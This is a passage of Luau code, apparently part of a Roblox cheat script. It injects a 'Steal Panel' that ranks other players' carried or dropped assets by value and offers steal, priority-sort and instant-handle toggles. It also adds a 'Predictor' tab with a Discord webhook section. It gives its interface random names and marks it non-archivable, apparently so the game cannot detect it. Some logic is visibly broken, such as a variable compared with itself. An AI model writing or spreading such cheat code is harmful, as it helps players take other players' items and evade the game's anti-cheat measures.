
			return formatted18, n22
		end

		local value471 = nil

		local function func561(flag569)
			local result92 = func548()

			if result92 and flag569 == n13 and flag543 then
				local tbl428 = {}
				local now = os.clock()
				local n22 = -1
				local value472 = nil

				for _, value473 in pairs(result92) do
					local uid = type(value473) == "table" and value473.Uid or nil
					local state3 = value473.State == "Slot" or value473.State == "Dropped" or value473.State == "Carried"

					if type(uid) == "string" and state3 and type(value473.AssetCategory) == "string" then
						tbl428[uid] = true
						local assetCategory17 = func530(value473.AssetCategory)
						local entry36 = tbl415[uid]

						if not entry36 then
							entry36 = { Uid = uid }
							tbl415[uid] = entry36
						end

						local scale = tonumber(value473.AssetScale) or 1

						if entry36.Detail == nil or entry36.Scale ~= scale or entry36.Category ~= value473.AssetCategory then
							entry36.Scale = scale
							local value474, value475 = func560(value473.AssetCategory, scale)
							entry36.Detail = value474
							entry36.Weight = value475
						end

						entry36.Category = value473.AssetCategory
						entry36.Style = assetCategory17
						entry36.Value = func531(value473, assetCategory17)
						entry36.Position = typeof(value473.BottomCFrame) == "CFrame" and value473.BottomCFrame.Position or nil

						if (value473.State == "Slot" or value473.State == "Dropped") and assetCategory17.Icon ~= "" and entry36.Value > n22 then
							n22 = entry36.Value
							value472 = entry36
						end

						if flag545 and value461 then
							local entry37 = tbl414[uid]

							if not entry37 then
								entry37 = func557(uid)
								tbl414[uid] = entry37
							end

							func558(entry37, entry36)
						end
					end

					if not (n5 < os.clock() - now) then
						continue
					end
					RunService.Heartbeat:Wait()
					now = os.clock()
					if flag569 ~= n13 or not flag543 then
						return
					end
				end

				for k in pairs(tbl415) do
					if not tbl428[k] then
						tbl415[k] = nil
						local entry38 = tbl414[k]

						if entry38 then
							tbl414[k] = nil
							entry38.Frame:Destroy()
						end
					end
				end

				if imageLabel and value472 and imageLabel.Image ~= value472.Style.Icon then
					imageLabel.Image = value472.Style.Icon
				end

				func555()
			end
		end

		local n22 = 0

		local function func562(param284)
			if flag548 and os.clock() - n22 < 10 then
				flag549 = true
				return
			end
			flag548 = true
			n22 = os.clock()
			pcall(func561, param284)

			if n22 == n22 then
				flag548 = false
			end

			if flag549 then
				flag549 = false
				value471()
			end
		end

		value471 = function()
			if flag547 or not flag543 then
				return
			end
			flag547 = true
			local flag570 = n13

			task.delay(flag545 and 0.15 or 1, function()
				flag547 = false

				if flag543 and flag570 == n13 then
					task.spawn(pcall, func562, flag570)
				end
			end)
		end

		local function func563(param285)
			if flag545 or not value459 then
				return
			end
			flag545 = true

			if param285 then
				obj89:Set(true)
			end

			if func550() then
				RunService.Heartbeat:Wait()
				if not flag545 or not value459 then
					return
				end
			end

			func551(true)
			value458.Enabled = true

			if tween then
				tween:Cancel()
			end

			local scale = position.Y.Scale
			local offset = position.Y.Offset
			value459.Position = UDim2.new(position.X.Scale, math.ceil(value459.AbsoluteSize.X * n11), scale, offset)
			tween = TweenService:Create(value459, tweenInfo, { Position = position })
			tween:Play()
			func541()
			func556()
			task.spawn(pcall, func562, n13)
		end

		local function func564(param286, param287)
			if not flag545 or not value459 then
				return
			end
			flag545 = false

			if param287 then
				obj89:Set(false)
			end

			if tween then
				tween:Cancel()
			end

			local scale = position.Y.Scale
			local offset = position.Y.Offset
			local tween3 = TweenService:Create(value459, tweenInfo2, { Position = UDim2.new(position.X.Scale, math.ceil(value459.AbsoluteSize.X * n11), scale, offset) })
			tween = tween3

			tween3.Completed:Connect(function(playbackState)
				if playbackState == Enum.PlaybackState.Completed and tween == tween3 and not flag545 and value458 then
					value458.Enabled = false
					value459.Position = position
				end
			end)

			tween3:Play()

			if param286 then
				func551(false)
			end
		end

		local function createScreenGui(param288)
			local screenGui = Instance.new("ScreenGui")
			screenGui.Name = func3()
			screenGui.Archivable = false
			screenGui.ResetOnSpawn = false
			screenGui.IgnoreGuiInset = param288.IgnoreGuiInset
			screenGui.ZIndexBehavior = param288.ZIndexBehavior
			screenGui.DisplayOrder = param288.DisplayOrder

			pcall(function()
				screenGui.ScreenInsets = param288.ScreenInsets
			end)

			return screenGui
		end

		local function func565()
			if value456 and value456.Parent and value457 and value457.Button then
				return true
			end
			local pets2 = func535(value455.Pets)
			if not pets2 then
				return false
			end

			for _, item148 in ipairs({ "Notification", "ReadyNotification", "NightImage", "NightText", "ConsoleButton", "Badge" }) do
				local obj92 = pets2:FindFirstChild(item148)

				if obj92 then
					obj92:Destroy()
				end
			end

			value457 = func542(pets2)
			imageLabel = pets2:FindFirstChild("ImageLabel")

			if value457.Scale then
				value457.Scale.Scale = 1
			end

			func543(value457, tbl315.Chilli)
			func544(value457)
			func546(value457)
			pets2.AnchorPoint = Vector2.new(0.5, 0.5)
			pets2.LayoutOrder = 0

			pets2.Activated:Connect(function()
				str1.UiDefer(function()
					if not value458 or not value458.Parent then
						pcall(value465)

						str1.UiDefer(function()
							if value458 and not flag545 then
								pcall(func563, true)
							end
						end)

						return
					end

					if flag545 then
						func564(true, true)
					else
						func563(true)
					end
				end)
			end)

			func539(pets2)
			func536(pets2)
			value456 = createScreenGui(value455.Hud)
			pets2.Parent = value456
			value456.Parent = value1
			return true
		end

		local value476 = nil
		local value477 = nil

		local function func566()
			local button = value457 and value457.Button
			local eggs = value455.Eggs
			local pets = value455.Pets
			if not button or not eggs.Parent or not pets.Parent then
				return
			end

			if value455.Hud.Enabled and value455.GameHud.Visible and value455.Column.Visible and eggs.Visible and pets.Visible and eggs.AbsoluteSize.X > 0 then
				local uiScale = eggs:FindFirstChildOfClass("UIScale")
				local scale = uiScale and uiScale.Scale or 1

				if scale <= 0 then
					scale = 1
				end

				local n23 = eggs.AbsolutePosition + eggs.AbsoluteSize / 2
				local n24 = pets.AbsolutePosition + pets.AbsoluteSize / 2
				local n25 = eggs.AbsoluteSize / scale
				local absolutePosition = value456.AbsolutePosition
				local udim24 = UDim2.fromOffset(n23.X - absolutePosition.X, n23.Y - n24.Y - n23.Y - absolutePosition.Y)
				local udim25 = UDim2.fromOffset(n25.X, n25.Y)

				if not flag545 then
					value476 = udim24
					value477 = udim25
				end

				if button.Position ~= udim24 then
					button.Position = udim24
				end

				if button.Size ~= udim25 then
					button.Size = udim25
					func540()
				end
			elseif not flag545 and value476 then
				if button.Position ~= value476 then
					button.Position = value476
				end

				if value477 and button.Size ~= value477 then
					button.Size = value477
					func540()
				end
			end

			if button.Visible ~= true then
				button.Visible = true
			end
		end

		local function func567()
			local frame = value455.ActivePets.Frame
			local obj93 = func535(frame)
			if not obj93 then
				return false
			end
			local header = obj93:FindFirstChild("Header")
			local scrollingFrame = obj93:FindFirstChild("ScrollingFrame")
			local close = obj93:FindFirstChild("Close")
			local template = scrollingFrame and scrollingFrame:FindFirstChild("Template")
			local spacer = template and template:FindFirstChild("Spacer")
			local unequip = spacer and spacer:FindFirstChild("Unequip")
			local textLabel = spacer and spacer:FindFirstChild("TextLabel")
			if not (header and scrollingFrame and close and spacer and unequip and textLabel) then
				obj93:Destroy()
				return false
			end

			for _, child in ipairs(scrollingFrame:GetChildren()) do
				if child ~= template and child:IsA("GuiObject") and child.Name ~= "EmptyLast" then
					child:Destroy()
				end
			end

			local equipBest = obj93:FindFirstChild("EquipBest")

			if equipBest then
				equipBest:Destroy()
			end

			local uiAspectRatioConstraint = obj93:FindFirstChildOfClass("UIAspectRatioConstraint")
			local aspectRatio = uiAspectRatioConstraint and uiAspectRatioConstraint.AspectRatio or 1.25
			local num124 = not UserInputService.MouseEnabled
			local n23 = num124 and 1.2 or 1
			num124 = num124 and 1.15 or 1
			local aspectRatio2 = n9 / num124
			local n24 = aspectRatio2 / aspectRatio
			value464 = { Width = frame.Size.X.Scale, Height = frame.Size.Y.Scale, Aspect = aspectRatio }
			obj93.Size = UDim2.new(n7 * n23, 0, n8 * n23 * num124, 0)

			if not uiAspectRatioConstraint then
				uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.Parent = obj93
			end

			uiAspectRatioConstraint.AspectRatio = aspectRatio2
			uiAspectRatioConstraint.AspectType = Enum.AspectType.FitWithinMaxSize
			header.Size = UDim2.new(header.Size.X.Scale, header.Size.X.Offset, header.Size.Y.Scale * n24, header.Size.Y.Offset)
			header.Position = UDim2.new(header.Position.X.Scale, header.Position.X.Offset, header.Position.Y.Scale * n24, header.Position.Y.Offset)
			close.Size = UDim2.new(close.Size.X.Scale * 1, close.Size.X.Offset, close.Size.Y.Scale * n24, close.Size.Y.Offset)
			close.Position = UDim2.new(close.Position.X.Scale * 1, close.Position.X.Offset, close.Position.Y.Scale, close.Position.Y.Offset)
			local scale = scrollingFrame.Size.Y.Scale
			local scale2 = scrollingFrame.Position.Y.Scale
			local y = scrollingFrame.AnchorPoint.Y
			local n25 = (scale2 - scale * y) * n24
			local n26 = 1 - (1 - scale2 + scale * (1 - y)) * n24
			scrollingFrame.Size = UDim2.new(scrollingFrame.Size.X.Scale, scrollingFrame.Size.X.Offset, n26 - n25, 0)
			scrollingFrame.Position = UDim2.new(scrollingFrame.Position.X.Scale, scrollingFrame.Position.X.Offset, n25 + (n26 - n25) * y, 0)
			local scale3 = scrollingFrame.Size.Y.Scale
			local y2 = scrollingFrame.AnchorPoint.Y
			local n27 = scrollingFrame.Position.Y.Scale - scale3 * y2
			local n28 = n27 + scale3
			local n29 = 0.1 * n24
			local n30 = 0.02 * n24
			local frame2 = Instance.new("Frame")
			frame2.BackgroundTransparency = 1
			frame2.BorderSizePixel = 0
			frame2.AnchorPoint = Vector2.new(0.5, 0)
			frame2.Position = UDim2.new(0.5, 0, n27 + n30, 0)
			frame2.Size = UDim2.new(0.9, 0, n29, 0)
			frame2.Parent = obj93
			local n31 = n27 + n30 * 1.5 + n29
			scrollingFrame.Size = UDim2.new(scrollingFrame.Size.X.Scale, scrollingFrame.Size.X.Offset, n28 - n31, 0)
			scrollingFrame.Position = UDim2.new(scrollingFrame.Position.X.Scale, scrollingFrame.Position.X.Offset, n31 + (n28 - n31) * y2, 0)
			local clone = unequip:Clone()
			clone.AnchorPoint = Vector2.new(0, 0.5)
			clone.Position = UDim2.new(0, 0, 0.5, 0)
			clone.Size = UDim2.new(0.37, 0, 1, 0)
			clone.Parent = frame2
			local value478 = func542(clone)
			func544(value478)

			clone.Activated:Connect(function()
				local value479 = value2
				local flag571 = value2

				if value479 then
					flag571 = type(value479.Set) == "function"
				end

				if flag571 then
					pcall(value479.Set, value479, not str1.Toggle(value479, false))
				end

				str1.UiDefer(func554)
			end)

			local clone2 = unequip:Clone()
			clone2.Parent = frame2
			local value480 = func542(clone2)
			func544(value480)

			clone2.Activated:Connect(function()
				local safeCarry = str1.SafeCarry
				local lineDrop = not safeCarry.LineDrop
				local instantHandle = safeCarry.InstantHandle

				if instantHandle and type(instantHandle.Set) == "function" then
					pcall(instantHandle.Set, instantHandle, lineDrop)
				end

				safeCarry.LineDrop = lineDrop
				str1.UiDefer(func554)
			end)

			local uiListLayout = Instance.new("UIListLayout")
			uiListLayout.FillDirection = Enum.FillDirection.Horizontal
			uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
			uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			uiListLayout.Padding = UDim.new(0.06, 0)
			uiListLayout.Parent = frame2
			clone.Size = UDim2.new(0.46, 0, 1, 0)
			clone.LayoutOrder = 1
			clone2.Size = UDim2.new(0.46, 0, 1, 0)
			clone2.LayoutOrder = 2
			value463 = { Toggle = value478, Guard = value480 }

			str1.StealPanelSync = function()
				str1.UiDefer(func554)
			end

			local uiGradient = header:FindFirstChildOfClass("UIGradient")

			if uiGradient then
				local func568 = func466
				local tbl429 = { 0, color2(200, 18, 24) }
				local tbl430 = { 0.53, color2(255, 88, 90) }
				local tbl431 = { 1, color2(214, 28, 34) }
				local tbl432 = { tbl429, tbl430, tbl431 }
				uiGradient.Color = func568(tbl432)
			end

			title = header:FindFirstChild("Title")
			func533(title, "Steal Panel")
			local plusEquip = header:FindFirstChild("PlusEquip")
			value460 = func542(plusEquip)

			if value460 then
				func543(value460, tbl315.Steal)
				func533(value460.Label, "Sort: " .. tostring(flag1))
				func544(value460)
				local n32 = 0

				local function func569()
					if os.clock() - n32 < 0.25 then
						return
					end
					n32 = os.clock()
					local entry39 = list2[(table.find(list2, flag1) or 4) % #list2 + 1]
					local priorityHandle = str1.Steal.PriorityHandle

					if priorityHandle and type(priorityHandle.Set) == "function" then
						pcall(priorityHandle.Set, priorityHandle, entry39)
					end

					if flag1 ~= entry39 then
						flag1 = entry39

						if type(str1.ResortSteal) == "function" then
							str1.ResortSteal()
						end
					end

					str1.UiDefer(function()
						func533(value460.Label, "Sort: " .. tostring(flag1))
						func555()
					end)
				end

				pcall(function()
					plusEquip.Active = true
					plusEquip.Interactable = true
					plusEquip.AutoButtonColor = true
				end)

				for _, descendant in ipairs(plusEquip:GetDescendants()) do
					if descendant:IsA("GuiObject") then
						pcall(function()
							descendant.Active = false
						end)
					end
				end

				plusEquip.Activated:Connect(func569)

				plusEquip.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
						func569()
					end
				end)
			end

			local value481 = func542(close)
			func544(value481)

			close.Activated:Connect(function()
				str1.UiDefer(function()
					func564(true, true)
				end)
			end)

			local clone3 = unequip:Clone()
			clone3.Name = "Cancel"
			clone3.Parent = spacer
			local uiAspectRatioConstraint2 = Instance.new("UIAspectRatioConstraint")
			uiAspectRatioConstraint2.AspectRatio = 1
			uiAspectRatioConstraint2.DominantAxis = Enum.DominantAxis.Height
			uiAspectRatioConstraint2.Parent = clone3
			unequip.Size = UDim2.new(0.24, 0, unequip.Size.Y.Scale, 0)
			unequip.Position = UDim2.new(0.852, 0, 0.5, 0)
			clone3.Size = UDim2.new(0.105, 0, unequip.Size.Y.Scale, 0)
			clone3.Position = UDim2.new(0.965, 0, 0.5, 0)
			local icon = spacer:FindFirstChild("Icon")

			if icon then
				icon.AnchorPoint = Vector2.new(0.5, 0.5)
				icon.Size = UDim2.new(0.2, 0, 1.3, 0)
				icon.Position = UDim2.new(0.1, 0, 0.5, 0)
			end

			textLabel.AnchorPoint = Vector2.new(textLabel.AnchorPoint.X, 0.5)
			textLabel.Size = UDim2.new(0.38, 0, 0.3, 0)
			textLabel.Position = UDim2.new(0.415, 0, 0.2, 0)
			func533(textLabel, "")
			local clone4 = textLabel:Clone()
			clone4.Name = "Value"
			clone4.Size = UDim2.new(0.38, 0, 0.23, 0)
			clone4.Position = UDim2.new(0.415, 0, 0.48, 0)
			local uiGradient2 = clone4:FindFirstChildOfClass("UIGradient")

			if not uiGradient2 then
				uiGradient2 = Instance.new("UIGradient")
				uiGradient2.Parent = clone4
			end

			uiGradient2.Color = tbl315.Steal.Color
			uiGradient2.Rotation = tbl315.Steal.Rotation
			clone4.Parent = spacer
			local clone5 = clone4:Clone()
			clone5.Name = "Detail"
			clone5.Size = UDim2.new(0.4, 0, 0.3, 0)
			clone5.Position = UDim2.new(0.415, 0, 0.78, 0)
			local uiGradient3 = clone5:FindFirstChildOfClass("UIGradient")

			if uiGradient3 then
				uiGradient3.Color = tbl315.Hud.Color
				uiGradient3.Rotation = tbl315.Hud.Rotation
			end

			clone5.Parent = spacer
			local value482 = func542(unequip)
			func533(value482.Label, "Steal")
			func543(value482, tbl315.Steal)
			local value483 = func542(clone3)
			func533(value483.Label, "X")
			func543(value483, tbl315.Cancel)
			clone3.Position = udim2
			clone3.Visible = false
			unequip.Position = udim22
			unequip.Size = udim23
			local clone6 = clone3:Clone()
			clone6.Name = "Star"
			clone6.AnchorPoint = Vector2.new(1, 0.5)
			clone6.Size = UDim2.new(0.1, 0, 0.56, 0)
			clone6.Position = udim2
			clone6.Visible = true
			clone6.Parent = spacer
			local value484 = func542(clone6)
			func533(value484.Label, utf8.char(9733))
			func543(value484, tbl315.Queued)
			local func570 = ipairs
			local tbl433 = {}
			local char2 = utf8.char(9650)
			local n32 = n20 - n19
			local tbl434 = { "Up", char2, n32 }
			local char3 = utf8.char(9660)
			local tbl435 = { "Down", char3, n20 }
			tbl433[1] = tbl434
			tbl433[2] = tbl435

			for _, value485 in func570(tbl433) do
				local clone7 = clone3:Clone()
				clone7.Name = value485[1]
				clone7.AnchorPoint = Vector2.new(1, 0.5)
				clone7.Size = UDim2.new(0.1, 0, 0.56, 0)
				clone7.Position = UDim2.new(value485[3], 0, 0.6, 0)
				clone7.Visible = false
				clone7.Parent = spacer
				local value486 = func542(clone7)
				func533(value486.Label, value485[2])
				func543(value486, tbl315.Hud)
			end

			clone3.AnchorPoint = Vector2.new(1, 0)
			clone3.Position = UDim2.new(0.99, 0, 0.04, 0)
			clone3.Size = UDim2.new(0.06, 0, 0.28, 0)
			clone3.ZIndex = 8

			for _, descendant in ipairs(clone3:GetDescendants()) do
				if descendant:IsA("GuiObject") then
					descendant.ZIndex = descendant.ZIndex + 8
				end
			end

			local clone7 = clone4:Clone()
			clone7.Name = "Rank"
			clone7.AnchorPoint = Vector2.new(0, 0)
			clone7.Position = UDim2.new(0.012, 0, 0.03, 0)
			clone7.Size = UDim2.new(0.1, 0, 0.36, 0)
			clone7.TextXAlignment = Enum.TextXAlignment.Left
			clone7.ZIndex = 6
			clone7.Visible = false
			func533(clone7, "#1")
			local uiGradient4 = clone7:FindFirstChildOfClass("UIGradient")

			if uiGradient4 then
				uiGradient4.Color = tbl315.PriorityOn.Color
				uiGradient4.Rotation = 90
			end

			clone7.Parent = spacer
			template.Visible = false
			template.Parent = nil
			value462 = template
			value461 = scrollingFrame
			value459 = obj93
			position = frame.Position
			obj93.Position = position
			func539(obj93, true)
			func536(obj93)
			value458 = createScreenGui(value455.ActivePets)
			value458.Enabled = false
			obj93.Parent = value458
			value458.Parent = value1
			table.insert(tbl416, scrollingFrame:GetPropertyChangedSignal("AbsoluteSize"):Connect(func556))
			table.insert(tbl416, obj93:GetPropertyChangedSignal("AbsoluteSize"):Connect(func541))
			return true
		end

		local function func571()
			if not flag543 then
				return
			end
			flag543 = false
			n13 += 1
			flag547 = false
			flag549 = false

			if flag545 then
				flag545 = false

				if not func549() then
					func551(false, true)
				end
			end

			if tween then
				tween:Cancel()
				tween = nil
			end

			flag2.DisconnectAll(tbl416)
			table.clear(tbl414)
			table.clear(tbl415)

			if value458 then
				value458:Destroy()
			end

			if value462 then
				value462:Destroy()
			end

			value458 = nil
			value459 = nil
			position = nil
			title = nil
			value460 = nil
			value461 = nil
			value462 = nil
			n14 = 0
			value463 = nil
			value464 = nil
			n15 = 1
			value455 = nil
		end

		value465 = function()
			if flag543 then
				return
			end
			local result93 = func534()

			if not result93 then
				if not flag544 then
					flag544 = true

					task.delay(2, function()
						flag544 = false

						if not flag543 and str1.Toggle(nil, true) then
							value465()
						end
					end)
				end

				return
			end

			value455 = result93
			flag543 = true
			n13 += 1
			local flag572 = n13
			uiStroke = value455.ActivePets.Frame:FindFirstChildOfClass("UIStroke")
			thickness = uiStroke and uiStroke.Thickness or nil
			tbl418.Panel = thickness or 2.3120369911193848
			local uiStrokeClr = value455.Pets:FindFirstChild("UIStrokeClr")
			tbl418.Hud = uiStrokeClr and uiStrokeClr:IsA("UIStroke") and uiStrokeClr.Thickness or 2.3120369911193848
			if not func565() or not func567() then
				func571()
				return
			end

			if flag546 then
				flag546 = false
				task.spawn(func563)
			end

			table.insert(tbl416, RunService.RenderStepped:Connect(func566))

			if uiStroke then
				table.insert(tbl416, uiStroke:GetPropertyChangedSignal("Thickness"):Connect(func540))
			end

			for _, item149 in ipairs({ value455.ActivePets, value455.GrowingEggs }) do
				if item149 then
					table.insert(tbl416, item149:GetPropertyChangedSignal("Enabled"):Connect(function()
						if item149.Enabled and flag545 then
							func564(false)
						end
					end))
				end
			end

			local eggState = tbl1.EggState

			if type(eggState) == "table" then
				for _, item150 in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "FieldClaimed", "SnapshotRefreshed" }) do
					local entry40 = eggState[item150]

					if type(entry40) == "table" and type(entry40.Connect) == "function" then
						local ok, result = pcall(entry40.Connect, entry40, value471)

						if ok and result then
							table.insert(tbl416, result)
						end
					end
				end
			end

			local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")

			if areaEggSlotsClient then
				table.insert(tbl416, areaEggSlotsClient.ChildAdded:Connect(value471))
				table.insert(tbl416, areaEggSlotsClient.ChildRemoved:Connect(value471))
			end

			task.spawn(function()
				local n23 = 0

				while true do
					if flag543 and flag572 == n13 then
						n23 += task.wait(0.5)

						if not (not flag543 or flag572 ~= n13) then
							if not (value455.Eggs:IsDescendantOf(game) and value455.ActivePets:IsDescendantOf(game)) then
								task.defer(function()
									func571()

									if str1.Toggle(nil, true) then
										value465()
									end
								end)

								break
							else
								if n4 <= n23 then
									value471()
									n23 = 0
								elseif flag545 then
									func555()
								end

								continue
							end
						end
					end

					break
				end
			end)

			task.spawn(pcall, func562, flag572)
		end

		func4(function()
			func571()

			if value456 then
				value456:Destroy()
			end

			func546(nil)
			value456 = nil
			value457 = nil
			imageLabel = nil
		end)

		str1.RestoreStealPanel = function()
			if obj89:Get() ~= true then
				return
			end

			if flag543 and value458 and not flag545 then
				task.spawn(func563)
			else
				flag546 = true
			end
		end

		task.defer(value465)
		obj87 = obj2:CreateTab({ Name = "Predictor", SectionsExpanded = true })
		obj77 = obj87:CreateSection({ Name = "Discord Webhook", Expanded = false })
		obj88 = obj87:CreateSection({ Name = "Egg Predictor", Expanded = true })
		obj78 = obj87:CreateSection({ Name = "Lab Predictor", Expanded = true })
		obj79 = obj87:CreateSection({ Name = "Fuse Predictor", Expanded = false })

		local function func572(param289, param290)
			local ok, result = pcall(Font.new, param289, param290, Enum.FontStyle.Normal)
			return ok and result or nil
		end

		str39 = {
			Ready = type(obj88.CreateCanvas) == "function",
			Bullet = utf8.char(8226),
			Color = {
				Text = "#FFFFFF",
				Income = "#4DFF7A",
				Clock = "#FFC24D",
				Ready = "#4DFF7A",
				Growing = "#FFC24D",
				Inventory = "#7FD8FF",
				Weight = "#CDE7FF",
				Scale = "#FFDF8A",
				Separator = "#7A8CC0",
				Hint = "#9FB8FF",
			},
			NameFont = func572("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold),
		}

		str39.RarityFont = func572("rbxassetid://12187365977", Enum.FontWeight.Bold) or func572("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular)
		local sequence2 = flag2.Sequence
		local tbl436 = { 0, Color3.fromRGB(255, 255, 255) }
		local tbl437 = { 0.5, Color3.fromRGB(222, 238, 255) }
		local tbl438 = { 1, Color3.fromRGB(255, 255, 255) }
		local tbl439 = { tbl436, tbl437, tbl438 }
		str39.NameGradient = sequence2(tbl439)
	end

	local sequence2 = flag2.Sequence
	local tbl440 = { 0, Color3.fromRGB(255, 255, 255) }
	local tbl441 = { 0.2, Color3.fromRGB(206, 212, 224) }
	local tbl442 = { 0.42, Color3.fromRGB(74, 80, 94) }
	local tbl443 = { 0.58, Color3.fromRGB(42, 46, 56) }
	local tbl444 = { 0.78, Color3.fromRGB(158, 166, 182) }
	local tbl445 = { 1, Color3.fromRGB(250, 252, 255) }
	local tbl446 = { tbl440, tbl441, tbl442, tbl443, tbl444, tbl445 }
	str39.SecretGradient = sequence2(tbl446)
	str39.SecretRotation = 90

	str39.Paint = function(param291, param292)
		return string.format("<font color=\"%s\">%s</font>", param291, param292)
	end

	str39.Bold = function(param293)
		return "<b>" .. tostring(param293) .. "</b>"
	end

	str39.Escape = function(param294)
		return (string.gsub(tostring(param294), "[<>&]", { ["<"] = "&lt;", [">"] = "&gt;", ["&"] = "&amp;" }))
	end

	str39.Separator = function()
		return str39.Paint(str39.Color.Separator, "  " .. str39.Bullet .. "  ")
	end

	str39.FormatRate = function(param295)
		local n13 = tonumber(param295) or 0
		if n13 >= 1e12 then
			return string.format("%.2fT/s", n13 / 1e12)
		end

		if n13 >= 1e9 then
			return string.format("%.2fB/s", n13 / 1e9)
		end

		if n13 >= 1000000 then
			return string.format("%.2fM/s", n13 / 1000000)
		end

		if n13 >= 1000 then
			return string.format("%.1fK/s", n13 / 1000)
		end
		return string.format("%d/s", math.floor(n13))
	end

	str39.FormatWeight = function(param296)
		local n13 = tonumber(param296) or 0
		local str48 = n13 >= 1000 and string.format("%.0f", n13) or string.format("%.2f", n13)
		local flag573, flag574 = string.match(str48, "^(%-?%d+)(%.%d+)$")
		str48 = flag573 or str48
		local str49

		while true do
			local flag575
			str49, flag575 = string.gsub(str48, "^(%-?%d+)(%d%d%d)", "%1,%2")

			if flag575 ~= 0 then
				str48 = str49
			else
				break
			end
		end

		return str49 .. (flag574 or "") .. " Kg"
	end

	str39.FormatClock = function(param297)
		local n13 = math.max(0, math.floor(tonumber(param297) or 0))
		return string.format("%02dh %02dm %02ds", math.floor(n13 / 3600), math.floor(n13 % 3600 / 60), n13 % 60)
	end

	str39.ScaleFactor = function(num125)
		if num125 > 5 then
			return (num125 / 5) ^ 1.2 * 19.637875755794113
		end
		return num125 ^ 1.85
	end

	str39.MutationMultiplier = function(flag576)
		flag576 = type(flag576) == "table" and flag576 or {}
		local mutations = tbl1.Mutations

		if type(mutations) == "table" and type(mutations.EarningsFor) == "function" then
			local ok, result = pcall(mutations.EarningsFor, flag576)
			if ok and type(result) == "number" then
				return result
			end
		end

		return 1
	end

	local tbl447 = {
		Golden = "#FFD34D",
		Silver = "#E6EEF7",
		Sakura = "#FF9ED8",
		GreatBloom = "#7CFFC4",
		Boss = "#FF7A7A",
		Monstrous = "#C08BFF",
	}

	local tbl448 = { "#FF6B6B", "#FFB36B", "#FFF06B", "#6BFF8A", "#6BC8FF", "#B96BFF" }

	str39.MutationText = function(list62)
		local tbl449 = {}

		if type(list62) == "table" then
			for _, item151 in ipairs(list62) do
				local uppered = string.upper(func7(item151))

				if item151 == "Rainbow" or item151 == "Prismatic" then
					local tbl450 = {}

					for i = 1, #uppered do
						table.insert(tbl450, str39.Paint(tbl448[(i - 1) % #tbl448 + 1], string.sub(uppered, i, i)))
					end

					local insert = table.insert
					local packed3 = table.pack(str39.Bold(table.concat(tbl450)))
					insert(tbl449, table.unpack(packed3, 1, packed3.n))
				else
					table.insert(tbl449, str39.Bold(str39.Paint(tbl447[item151] or "#8FE3FF", str39.Escape(uppered))))
				end
			end
		end

		return table.concat(tbl449, " ")
	end

	local rarityGradients = nil

	local function func573(player9)
		if type(player9) == "table" and typeof(player9.RarityGradient) == "Instance" then
			return player9.RarityGradient
		end

		if rarityGradients == nil then
			local assets = ReplicatedStorage:FindFirstChild("Assets")
			assets = assets and assets:FindFirstChild("UI")
			rarityGradients = assets and assets:FindFirstChild("RarityGradients") or false
		end

		if not rarityGradients or type(player9) ~= "table" then
			return nil
		end
		local obj94 = rarityGradients:FindFirstChild(tostring(player9._id or player9.DisplayName or ""))
		return obj94 and obj94:FindFirstChild("RarityGradient") or nil
	end

	local tbl451 = {}

	str39.AssetInfo = function(param298)
		local category = tostring(param298)
		local entry41 = tbl451[category]
		if entry41 then
			return entry41
		end
		local directory = tbl1.Assets and tbl1.Assets.Directory
		local flag577 = type(directory) == "table" and directory[category] or nil

		if flag577 == nil and type(directory) == "table" then
			local cleaned2 = string.gsub(string.lower(category), "[^%a%d]", "")

			for k, value487 in pairs(directory) do
				if type(value487) == "table" then
					local str50 = tostring(k)
					local str51 = tostring(value487._id or "")
					local func574 = tostring
					local displayName = value487.DisplayName or ""
					local packed4 = table.pack(func574(displayName))
					local list63 = { str50, str51 }

					do
						local values = table.pack(table.unpack(packed4, 1, packed4.n))
						table.move(values, 1, values.n, 3, list63)
					end

					local egg = type(value487.Egg) == "table" and value487.Egg or nil

					if egg ~= nil then
						list63[#list63 + 1] = tostring(egg.ModelName or "")
					end

					for _, item152 in ipairs(list63) do
						if item152 ~= "" and string.gsub(string.lower(item152), "[^%a%d]", "") == cleaned2 then
							flag577 = value487
							break
						end
					end
				end

				if flag577 == nil then
					continue
				end
				break
			end
		end

		local rarity = type(flag577) == "table" and type(flag577.Rarity) == "table" and flag577.Rarity or nil
		local icon = type(flag577) == "table" and flag577.Icon or nil
		local rarity2

		if rarity then
			rarity2 = tostring(rarity.DisplayName or rarity._id or "Common")
		else
			rarity2 = rarity
		end

		rarity2 = rarity2 or "Common"
		local color3 = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or Color3.fromRGB(255, 255, 255)
		local tbl452 = {}
		local name = type(flag577) == "table"

		if name then
			name = tostring(flag577.DisplayName or category)
		end

		tbl452.Name = name or category
		tbl452.Category = category
		tbl452.Rarity = rarity2
		local rarityNumber

		if rarity then
			rarityNumber = tonumber(rarity.RarityNumber or rarity.Rank)
		else
			rarityNumber = rarity
		end

		tbl452.RarityNumber = rarityNumber or 0
		tbl452.Color = color3
		tbl452.Hex = "#" .. string.upper(color3:ToHex())
		tbl452.Gradient = func573(rarity)
		tbl452.EarningRate = type(flag577) == "table" and tonumber(flag577.EarningRate) or 0
		tbl452.Icon = type(icon) == "string" and icon ~= "" and icon or nil
		tbl451[category] = tbl452
		return tbl452
	end

	str39.Income = function(obj, param299, param300)
		if type(param299) ~= "number" or param299 <= 0 then
			return 0
		end
		return math.max(math.round(obj.EarningRate * str39.ScaleFactor(param299) * str39.MutationMultiplier(param300)), 1)
	end

	local function isShown(instance28)
		if typeof(instance28) ~= "Instance" or not instance28:IsDescendantOf(game) then
			return false
		end

		while instance28 do
			if instance28:IsA("GuiObject") and not instance28.Visible then
				return false
			end

			if instance28:IsA("LayerCollector") then
				return instance28.Enabled
			end
			instance28 = instance28.Parent
		end

		return false
	end

	str39.PageVisible = function()
		local ok, result = pcall(function()
			return obj87.Page
		end)

		if not ok or typeof(result) ~= "Instance" then
			return true
		end
